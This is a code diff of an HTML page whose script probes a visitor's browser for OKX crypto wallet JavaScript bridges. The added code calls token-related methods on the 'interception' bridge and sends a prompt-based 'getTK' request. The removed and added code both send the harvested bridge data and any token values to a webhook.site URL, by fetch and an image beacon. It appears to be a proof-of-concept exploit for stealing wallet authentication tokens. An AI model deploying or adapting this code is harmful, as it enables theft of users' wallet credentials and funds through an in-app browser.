@@ -4,24 +4,13 @@
 <body>
 <h1 id="status">Checking...</h1>
 <pre id="results"></pre>
+<pre id="tk_results">TK testing...</pre>
 <script>
 var WEBHOOK = 'https://webhook.site/aa2b16e2-fb70-4219-a296-8c9c6977baf5';
-var bridges = {
-    '_solana_': typeof window['_solana_'],
-    'okxBtcJSBridge': typeof window['okxBtcJSBridge'],
-    'okxStarkJSBridge': typeof window['okxStarkJSBridge'],
-    '_aptos_': typeof window['_aptos_'],
-    '_okx_sui_': typeof window['_okx_sui_'],
-    'tron': typeof window['tron'],
-    'okxOsmosJSBridge': typeof window['okxOsmosJSBridge'],
-    'okxNostrJSBridge': typeof window['okxNostrJSBridge'],
-    'okxInternalJSBridge': typeof window['okxInternalJSBridge'],
-    'interception': typeof window['interception'],
-    'native': typeof window['native'],
-    'AndroidApi': typeof window['AndroidApi']
-};
+var bridgeNames = ['_solana_','okxBtcJSBridge','okxStarkJSBridge','_aptos_','_okx_sui_','tron','okxOsmosJSBridge','okxNostrJSBridge','okxInternalJSBridge','interception','native','AndroidApi'];
+var bridges = {};
+bridgeNames.forEach(function(name) { bridges[name] = typeof window[name]; });
 
-// Collect all window keys that might be bridge-related
 var suspiciousKeys = [];
 try {
     for (var k in window) {
@@ -30,48 +19,63 @@ try {
             if (k.indexOf('okx') !== -1 || k.indexOf('_sol') !== -1 || 
                 k.indexOf('aptos') !== -1 || k === 'AndroidApi' ||
                 k === 'interception' || k === 'native' ||
-                k.indexOf('Bridge') !== -1 || k.indexOf('bridge') !== -1) {
+                k.indexOf('Bridge') !== -1 || k.indexOf('bridge') !== -1 ||
+                k.indexOf('Provider') !== -1) {
                 suspiciousKeys.push(k + ':' + t);
             }
         }
     }
 } catch(e) {}
 
-var result = {
-    url: window.location.href,
-    ua: navigator.userAgent,
-    bridges: bridges,
-    suspicious: suspiciousKeys,
-    ts: new Date().toISOString()
-};
+var foundCount = Object.keys(bridges).filter(function(k){return bridges[k]!=='undefined'}).length;
+document.title = 'BRIDGES:' + foundCount;
+document.getElementById('status').textContent = 'Found ' + foundCount + ' bridges! Suspicious: ' + suspiciousKeys.length;
+document.getElementById('results').textContent = JSON.stringify({bridges: bridges, suspicious: suspiciousKeys, ua: navigator.userAgent}, null, 2);
 
-var foundCount = 0;
-for (var b in bridges) {
-    if (bridges[b] !== 'undefined') foundCount++;
-}
-
-document.title = 'BRIDGES:' + foundCount + ' FOUND';
-document.getElementById('status').textContent = 'Found ' + foundCount + ' bridges!';
-document.getElementById('results').textContent = JSON.stringify(result, null, 2);
-
-// Send to webhook
+// Test getTK via interception bridge
+var tkResults = {};
 try {
-    fetch(WEBHOOK + '?bridges=' + foundCount, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        mode: 'no-cors',
-        body: JSON.stringify(result)
-    });
-} catch(e) {
-    // Try XHR as fallback
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', WEBHOOK + '?bridges=' + foundCount, true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.send(JSON.stringify(result));
-}
+    if (typeof window.interception !== 'undefined') {
+        var inter = window.interception;
+        var interMethods = [];
+        for (var m in inter) {
+            if (typeof inter[m] === 'function') {
+                interMethods.push(m);
+                // Try calling getTK-like methods
+                if (m.toLowerCase().indexOf('tk') !== -1 || m.toLowerCase().indexOf('token') !== -1) {
+                    try { tkResults['interception.' + m] = String(inter[m]()); } 
+                    catch(e) { tkResults['interception.' + m + '_err'] = e.message; }
+                }
+            }
+        }
+        tkResults['interception_methods'] = interMethods;
+    }
+} catch(e) { tkResults['interception_scan_err'] = e.message; }
 
-// Also try img beacon
-new Image().src = WEBHOOK + '?bridges=' + foundCount + '&found=' + Object.keys(bridges).filter(function(k){return bridges[k]!=='undefined'}).join(',');
+try {
+    if (typeof window.okxInternalJSBridge !== 'undefined') {
+        var internal = window.okxInternalJSBridge;
+        var intMethods = [];
+        for (var m2 in internal) {
+            if (typeof internal[m2] === 'function') {
+                intMethods.push(m2);
+            }
+        }
+        tkResults['okxInternalJSBridge_methods'] = intMethods;
+    }
+} catch(e) { tkResults['internal_err'] = e.message; }
+
+// Try prompt-based getTK (OKX's protocol)
+try {
+    var tkPrompt = prompt(JSON.stringify({uri:'request',method:'getTK',data:[]}));
+    tkResults['prompt_getTK'] = tkPrompt;
+} catch(e) { tkResults['prompt_err'] = e.message; }
+
+document.getElementById('tk_results').textContent = JSON.stringify(tkResults, null, 2);
+document.title = 'BRIDGES:' + foundCount + ' TK:' + JSON.stringify(tkResults).length;
+
+// Beacon
+new Image().src = WEBHOOK + '?b=' + foundCount + '&s=' + suspiciousKeys.length + '&tk=' + encodeURIComponent(JSON.stringify(tkResults).substring(0,200));
 </script>
 </body>
 </html>
